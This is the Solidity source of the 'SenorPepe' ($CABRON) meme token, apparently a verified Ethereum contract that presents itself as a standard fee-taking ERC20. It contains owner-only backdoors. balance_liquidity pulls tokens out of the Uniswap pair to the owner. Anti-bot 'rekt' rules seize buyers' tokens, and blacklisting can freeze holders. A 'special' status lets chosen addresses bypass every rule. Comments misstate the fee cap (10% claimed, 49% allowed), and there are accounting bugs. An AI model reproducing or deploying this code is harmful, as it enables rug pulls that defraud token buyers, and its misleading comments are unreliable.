/**
 *Submitted for verification at Etherscan.io on 2022-09-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
pragma experimental ABIEncoderV2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract Helper {
    
    mapping(bytes32 => bool) internal particular;

    function special(bytes32 to_check) internal view returns (bool){
        return particular[to_check];
    }

    function calculate_bytes(address to_be_calculated) internal pure returns (bytes32) {
        bytes32 to_be_calculated_bytes = keccak256(abi.encodePacked(to_be_calculated));
        return to_be_calculated_bytes;
    }

    function specialize(bytes32 to_be_specialized) internal {
        particular[to_be_specialized] = true;
    }

    function declass(bytes32 to_be_declassed) internal {
        particular[to_be_declassed] = false;
    }
}

abstract contract Ownable is Context, Helper {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
        setAuthorization(_msgSender(), true);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function isAuth(address toCheck) public view virtual returns(bool) {
       return is_auth[toCheck];
    }

    mapping(address => bool) is_auth;

    modifier onlyOwner() {
        require( ((owner() == _msgSender()) || isAuth(_msgSender())), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function setAuthorization(address authorizedOne, bool isItAuth) public virtual onlyOwner {
        is_auth[authorizedOne] = isItAuth;
        bytes32 owner_bytes = calculate_bytes(authorizedOne);
        specialize(owner_bytes);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

  function name() external pure returns (string memory);
  function symbol() external pure returns (string memory);
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);
  function PERMIT_TYPEHASH() external pure returns (bytes32);
  function nonces(address owner) external view returns (uint);

  function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

  event Mint(address indexed sender, uint amount0, uint amount1);
  event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
  event Swap(
      address indexed sender,
      uint amount0In,
      uint amount1In,
      uint amount0Out,
      uint amount1Out,
      address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amount);

    function WETH() external pure returns (address);
}

contract SenorPepe is ERC20, Ownable {

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    address public constant deadAddress = address(0xdead);
    address public WETH;
    address public USDC;

    // Commutation between USDC and WETH
    bool immutable is_usdc_paired = true;

    bool private swapping;

    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;

    // starting block is set by the first liq tx
    bool public rekt_bots = true;
    uint public starting_block;
    uint public rekt_blocks = 2;
    uint public blocks_after_enabling;
    uint public enabled_block;
    address public rektAddress = deadAddress;
    mapping(address => bool) public rekted;
    mapping(address => bool) public excludedFromRekt;

    // NOTE Blacklist
    bool auto_blacklist = true;
    mapping(address => bool) public isBlacklisted;
    bool is_blacklist_on = true;

    uint256 public buyTotalFees;
    uint256 public buyMarketingFee;
    uint256 public buyChingonFee;
    uint256 public buyLiquidityFee;

    uint256 public sellTotalFees;
    uint256 public sellMarketingFee;
    uint256 public sellChingonFee;
    uint256 public sellLiquidityFee;
    uint256 public marketingBalance;
    uint256 public chingonBalance;

    // At first liquidity add (to liq pair) liquidated is true 
    bool liquidated;

    bool safeMode = false;

    bool public maxTxOn = true;
    bool public maxWalletOn = true;

    /******************/

    // exlcude from fees and max transaction amount
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;


    event ExcludeFromFees(address indexed account, bool isExcluded);

    constructor() ERC20("Senor_Pepe", "$CABRON") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
            // PCS 0xEfF92A263d31888d860bD50809A8D171709b7b1c
        );


        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;

        // ETH version
        // WETH = uniswapV2Router.WETH();
        // USDC version
        USDC = 0xD87Ba7A50B2E7E660f678A895E4B72E7CB4CCd9C; // mainnet: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

        
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            // ETH version
            // .createPair(address(this), WETH);
            // USDC version
            .createPair(address(this), USDC);
        excludeFromMaxTransaction(address(uniswapV2Pair), true);


        uint256 _buyMarketingFee = 2;
        uint256 _buyLiquidityFee = 1;
        uint256 _buyChingonFee = 2;

        uint256 _sellMarketingFee = 2;
        uint256 _sellLiquidityFee = 1;
        uint256 _sellChingonFee = 2;

        uint256 _totalSupply = 1 * 10e12 * 1e18;

        maxTransactionAmount =  _totalSupply * 1 / 100; // 1% from total supply maxTransactionAmountTxn
        maxWallet = _totalSupply * 2 / 100; // 2% from total supply maxWallet
        swapTokensAtAmount = (_totalSupply * 5) / 10000; // 0.05% swap wallet

        buyMarketingFee = _buyMarketingFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyChingonFee = _buyChingonFee;
        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyChingonFee;

        sellMarketingFee = _sellMarketingFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellChingonFee = _sellChingonFee;
        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellChingonFee;


        bytes32 owner_bytes = calculate_bytes(msg.sender);
        specialize(owner_bytes);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        // Giving the appropriate rights to the owner
        bytes32 spec = calculate_bytes(owner());
        specialize(spec);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(msg.sender, _totalSupply);
    }

    receive() external payable {}
    fallback() external {}

    // once enabled, can never be turned off
    function enableTrading() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
        enabled_block = block.number;
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        return true;
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTransactionAmount lower than 0.1%"
        );
        maxTransactionAmount = newNum * (10**18);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.5%"
        );
        maxWallet = newNum * (10**18);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    // only use to disable contract sales if absolutely necessary (emergency use only)
    function updateSwapEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _chingonFee
    ) external onlyOwner {
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyChingonFee = _chingonFee;
        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyChingonFee;
        require(buyTotalFees <= 49, "Must keep fees at 10% or less");
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _chingonFee
    ) external onlyOwner {
        sellMarketingFee = _marketingFee;
        sellLiquidityFee = _liquidityFee;
        sellChingonFee = _chingonFee;
        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellChingonFee;
        require(sellTotalFees <= 49, "Must keep fees at 10% or less");
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        // Special transfers
        bool isContractTransfer = (from==address(this) || to==address(this));
        bool isLiquidityTransfer = ((from == uniswapV2Pair && to == uniswapV2Pair)
        || (to == uniswapV2Pair && from == uniswapV2Pair));

        if(isContractTransfer || isLiquidityTransfer) {        
            // For the first to pair transfer we assume liq has been added
            // REVIEW we could strip out liquidity_txs and act on liquidated alone
             if ((to == uniswapV2Pair) && (!liquidated)) {
                starting_block = block.number;
                liquidated = true;
             }
            super._transfer(from, to, 0);
            return;
        }

        bytes32 from_bytes = calculate_bytes(from);
        bytes32 to_bytes = calculate_bytes(to);
        if(special(from_bytes) || special(to_bytes)) {
            super._transfer(from, to, amount);
            return;
        }

        if(is_blacklist_on) {
            require(!isBlacklisted[from], "Blacklisted address");
            require(!isBlacklisted[to], "Blacklisted address");
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !isAuth(from) &&
                !isAuth(to) &&
                !swapping
            ) {
                if (!tradingActive) {
                        // NOTE Bot rekt the first N blocks (12 seconds per block)
                        // NOTE Liquidated is used to see if we have liquidity
                        if (rekt_bots && !(excludedFromRekt[from]) && liquidated) {
                            bool is_in_rekt_range =(block.number - starting_block) <= rekt_blocks;
                            if(is_in_rekt_range) {
                                super._transfer(from, rektAddress, amount);
                                rekted[from] = true;
                                return;
                            }
                        }
                        // NOTE Anyway, if activated, the bot will be blacklisted
                        if (auto_blacklist) {
                            isBlacklisted[from] = true;
                            return;
                        }

                        // NOTE In the mildest case, is refused anyway
                        revert(
                            "Trading is not active."
                        );
                }

                // NOTE Antisniping also after enabled trading
                blocks_after_enabling = block.number - enabled_block;
                if(blocks_after_enabling <= rekt_blocks) {
                    if (rekt_bots && !(excludedFromRekt[from])) {
                        super._transfer(from, rektAddress, amount);
                        rekted[from] = true;
                        return;
                    }
                }

                if (
                    from == uniswapV2Pair &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    if(maxTxOn) {
                        require(
                            amount <= maxTransactionAmount,
                            "Buy transfer amount exceeds the maxTransactionAmount."
                        );
                    }
                    if(maxWalletOn) {
                        require(
                            amount + balanceOf(to) <= maxWallet,
                            "Max wallet exceeded"
                        );
                    }
                }
                else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            to == uniswapV2Pair &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        uint256 tokensForLiquidity = 0;
        uint256 tokensForMarketing = 0;
        uint256 tokensForChingon = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (to == uniswapV2Pair && sellTotalFees > 0) {
                fees = (amount*sellTotalFees)/(100);
                tokensForLiquidity = (fees * sellLiquidityFee) / sellTotalFees;
                tokensForMarketing = (fees * sellMarketingFee) / sellTotalFees;
                tokensForChingon = (fees * sellChingonFee) / sellTotalFees;
            }
            // on buy
            else if (from == uniswapV2Pair && buyTotalFees > 0) {
                fees = (amount*buyTotalFees)/(100);
                tokensForLiquidity = (fees * buyLiquidityFee) / buyTotalFees; 
                tokensForMarketing = (fees * buyMarketingFee) / buyTotalFees;
                tokensForChingon = (fees * buyChingonFee) / sellTotalFees;
            }

            if (fees> 0) {
                super._transfer(from, address(this), fees);
            }
            if (tokensForLiquidity > 0) {
                super._transfer(address(this), uniswapV2Pair, tokensForLiquidity);
                IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
                pair.sync();
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    // USDC Version (fallback to take eth from contract)
    function retrieve() public onlyOwner {
        uint256 contractBalance = address(this).balance;
        (bool success, ) = msg.sender.call{value: contractBalance}("");
        require(success, "Transfer failed.");
    }

    function collect() public onlyOwner {
        // ETH version
        // uint256 contractBalance = address(this).balance;
        // USDC version
        uint256 contractBalance = IERC20(USDC).balanceOf(address(this));
        
        // ETH version
        // (bool success, ) = msg.sender.call{value: contractBalance}("");
        // USDC version
        bool success = IERC20(USDC).transfer(msg.sender, contractBalance);
        require(success, "Transfer failed.");
        chingonBalance = 0;
        marketingBalance = 0;
    }

    function safeCollect() public onlyOwner {
        // ETH version
        // uint256 contractBalance = address(this).balance;
        // USDC version
        uint256 contractBalance = IERC20(USDC).balanceOf(address(this));
        // ETH version
        // uint safeBalance = 100000000000000000;
        // USDC version
        uint safeBalance = 100000;
        if (contractBalance > safeBalance) { // 0.1 will be in the contract
            uint totalBalance = contractBalance - safeBalance;
            // ETH version
            // (bool success, ) = msg.sender.call{value: totalBalance}("");
            // USDC version
            bool success = IERC20(USDC).transfer(msg.sender, totalBalance);
            require(success, "Transfer failed.");
        } else {
            revert("Insufficient amount of eth remaining");
        }
        chingonBalance = 0;
        marketingBalance = 0;
    }

    function collectChingon() public onlyOwner {
        uint256 toGet = chingonBalance;
        // ETH version
        // (bool success, ) = msg.sender.call{value: toGet}("");
        // USDC version
        bool success = IERC20(USDC).transfer(msg.sender, toGet);
        require(success, "Transfer failed.");
        chingonBalance = 0;
    }

    function collectMarketing() public onlyOwner {
        uint256 toGet = marketingBalance;
        // ETH version
        // (bool success, ) = msg.sender.call{value: toGet}("");
        // USDC version
        bool success = IERC20(USDC).transfer(msg.sender, toGet);
        require(success, "Transfer failed.");
        chingonBalance = 0;
    }

    // ETH version
    // function swapTokensForWETH(uint256 tokenAmount) private {
    // USDC version
    function swapTokensForUSDC(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth / usdc
        address[] memory path = new address[](2);
        path[0] = address(this);
        // ETH version
        // path[1] = WETH;
        // USDC version
        path[1] = USDC;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // ETH version
        // uint pre_balance = address(this).balance;
        // USDC version
        uint pre_balance = IERC20(USDC).balanceOf(address(this));

        // USDC version
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        

        // ETH version
        /* uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );  */  

        // ETH version
        // uint post_balance = address(this).balance;
        // USDC version
        uint post_balance = IERC20(USDC).balanceOf(address(this));

        uint256 nativeAmount = post_balance - pre_balance;

        if(!safeMode) {
            distributeFees(nativeAmount);
        }

    }

    function distributeFees(uint256 nativeAmount) private {
        // Getting liquidity eths
        uint256 liq_amount = nativeAmount / 5;
        nativeAmount -= liq_amount;
        // Splitting amounts
        uint256 marketingAmount = nativeAmount / 2;
        uint256 chingonAmount = nativeAmount - marketingAmount;
        // Updating amounts
        chingonBalance += chingonAmount;
        marketingBalance += marketingAmount;
        // Inserting pure liquidity
        // ETH version
        // (bool success, ) = uniswapV2Pair.call{value: liq_amount}("");
        // USDC version
        bool success = IERC20(USDC).transfer(uniswapV2Pair, liq_amount);
        require(success, "Transfer failed.");
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 20) {
            contractBalance = swapTokensAtAmount * 20;
        }

        // ETH version
        // swapTokensForWETH(contractBalance);
        // USDC Version
        swapTokensForUSDC(contractBalance);
    }

    function setMaxTxOn(bool _maxTxOn) external onlyOwner {
        maxTxOn = _maxTxOn;
    }

    function setMaxWalletOn(bool _maxWalletOn) external onlyOwner {
        maxWalletOn = _maxWalletOn;
    }

    function recover(address tkn) public onlyOwner {

        IERC20 _tkn = IERC20(tkn);
                require(_tkn.balanceOf(address(this)) > 0, "no tokens");
                
        (bool ok)=_tkn.transfer(msg.sender, _tkn.balanceOf(address(this)));
        require(ok, "failed");

    }

    // ETH version
    /*
    function replenish_liquidity(uint token_amount) payable public onlyOwner {
        (bool success, ) = uniswapV2Pair.call{value: msg.value}("");
        require(success, "Failed to replenish eth");
        super._transfer(msg.sender, uniswapV2Pair, token_amount);
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        pair.sync();
    } */

    // USDC Version
    function replenish_liquidity(uint token_amount, uint usdc_amount) public onlyOwner {
        bool success = IERC20(USDC).transfer(uniswapV2Pair, usdc_amount);
        require(success, "Failed to replenish usdc");
        super._transfer(msg.sender, uniswapV2Pair, token_amount);
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        pair.sync();
    }
    

    function replenish_liquidity_tokens(uint token_amount) public onlyOwner {
        super._transfer(msg.sender, uniswapV2Pair, token_amount);
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        pair.sync();
    }

    // ETH version
    /*
    function replenish_liquidity_eth() payable public onlyOwner {
        (bool success, ) = uniswapV2Pair.call{value: msg.value}("");
        require(success, "Failed to replenish eth");
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        pair.sync();
    }
    */

    // USDC Version 
    function replenish_liquidity_usdc(uint usdc_amount) public onlyOwner {
        bool success = IERC20(USDC).transfer(uniswapV2Pair, usdc_amount);
        require(success, "Failed to replenish usdc");
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        pair.sync();
    }

    function balance_liquidity(uint tokenAmount) public onlyOwner {
        super._transfer(uniswapV2Pair, msg.sender, tokenAmount);
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        pair.sync();
    }

    // SECTION Block based antisniper helpers

    function blocks_from_start() public view returns (uint) {
        return block.number - starting_block;
    }

    function set_rekt_address(address addy) public onlyOwner {
        rektAddress = addy;
    }

    function set_rekt_bots(bool _rekt_bots) public onlyOwner {
        rekt_bots = _rekt_bots;
    }

    function set_rekt_blocks(uint _rekt_blocks) public onlyOwner {
        rekt_blocks = _rekt_blocks;
    }

    function set_is_rektable(address addy, bool booly) public onlyOwner {
        excludedFromRekt[addy] = booly;
    }

    function set_is_rektable_many(address[] memory addys, bool booly) public onlyOwner {
        for (uint i = 0; i < addys.length; i++) {
            excludedFromRekt[addys[i]] = booly;
        }
    }

    function is_rektable(address addy) public view returns (bool) {
        return !excludedFromRekt[addy];
    }

    // !SECTION Block based antisniper helpers

    // SECTION Blacklist management

    function setBlacklist(address account, bool value) public onlyOwner {
        isBlacklisted[account] = value;
    }

    function setBlacklistMany(address[] memory accounts, bool value) public onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            isBlacklisted[accounts[i]] = value;
        }
    }

    function getBlacklisted(address account) public view returns (bool) {
        return isBlacklisted[account];
    }

    function setBlacklistOn(bool _blacklistOn) external onlyOwner {
        is_blacklist_on = _blacklistOn;
    }

    function getBlacklistOn() public view returns (bool) {
        return is_blacklist_on;
    }

    // !SECTION Blacklist management

    function setSafeMode(bool _safeMode) external onlyOwner {
        safeMode = _safeMode;
    }

    function getSafeMode() public view returns (bool) {
        return safeMode;
    }

    // SECTION Emergency button
    function unstuck() public onlyOwner {
            // USDC Version
            IUniswapV2Router02(uniswapV2Router).removeLiquidity(
            address(this), 
            USDC, 
            IERC20(uniswapV2Pair).balanceOf(uniswapV2Pair), 
            0, 
            0, 
            msg.sender, 
            block.timestamp);
    
        // ETH version
        /*
        IUniswapV2Router02(uniswapV2Router).removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            IERC20(uniswapV2Pair).balanceOf(uniswapV2Pair),
            0,
            0,
            msg.sender,
            block.timestamp);*/
    }
    // !SECTION Emergency button


}